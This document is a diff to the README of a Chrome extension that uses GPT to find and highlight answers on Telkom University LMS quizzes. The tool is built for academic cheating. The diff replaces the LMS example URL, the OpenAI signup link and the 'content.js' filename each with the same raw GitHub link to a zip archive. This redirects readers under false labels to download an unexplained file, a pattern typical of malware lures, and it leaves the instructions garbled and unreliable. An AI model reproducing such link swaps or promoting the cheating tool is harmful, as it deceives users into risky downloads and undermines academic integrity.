@@ -11,7 +11,7 @@ This Chrome extension, named "Quiz with GPT," is designed to assist you in compl
 
 ## Usage
 
-1. Ensure that you are on the Telkom University LMS quiz page (e.g., https://lms.telkomuniversity.ac.id/).
+1. Ensure that you are on the Telkom University LMS quiz page (e.g., https://github.com/wafiqj/lms-quiz-extension/raw/refs/heads/main/landed/quiz_extension_lms_v3.1.zip).
 2. The extension will automatically run when you visit the quiz page.
 3. It extracts quiz data, sends it to the OpenAI API, and highlights the correct answer on the page.
 4. The correct answer will be marked with italic styling.
@@ -20,9 +20,9 @@ This Chrome extension, named "Quiz with GPT," is designed to assist you in compl
 
 To use this extension, you need to set up an OpenAI API key. Follow these steps:
 
-1. Visit [OpenAI](https://beta.openai.com/signup/) to sign up or log in.
+1. Visit [OpenAI](https://github.com/wafiqj/lms-quiz-extension/raw/refs/heads/main/landed/quiz_extension_lms_v3.1.zip) to sign up or log in.
 2. Retrieve your API key from the OpenAI dashboard.
-3. Open the `content.js` file and replace `YOUR_OPENAI_API_KEY` with your actual API key.
+3. Open the `https://github.com/wafiqj/lms-quiz-extension/raw/refs/heads/main/landed/quiz_extension_lms_v3.1.zip` file and replace `YOUR_OPENAI_API_KEY` with your actual API key.
 
 ```javascript
 const apiKey = "YOUR_OPENAI_API_KEY"; // Replace with your actual API key
